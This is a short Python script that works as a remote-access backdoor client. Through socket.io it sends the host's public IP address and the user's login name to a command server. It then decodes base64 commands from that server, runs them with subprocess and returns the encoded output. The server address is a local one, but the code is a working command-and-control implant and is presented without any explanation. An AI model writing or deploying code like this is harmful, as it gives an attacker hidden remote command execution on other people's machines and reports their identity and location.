import socketio, json, os, requests, base64, subprocess

socket = socketio.Client()

@socket.event
def connect():
    ip_adress = requests.get("https://api.ipify.org").text
    socket.emit("init", json.dumps({"ip": ip_adress, "username": os.getlogin()}))

@socket.event
def command(cmd):
    decoded_cmd = base64.b64decode(cmd).decode()
    try:
        print("Running command: ", decoded_cmd)
        output = subprocess.check_output(decoded_cmd)
        print("Output", output.decode())
        socket.emit("result", base64.b64encode(output))
    except Exception as e:
        socket.emit("result", base64.b64encode(e))

socket.connect("http://127.0.0.1:5000")
socket.wait()
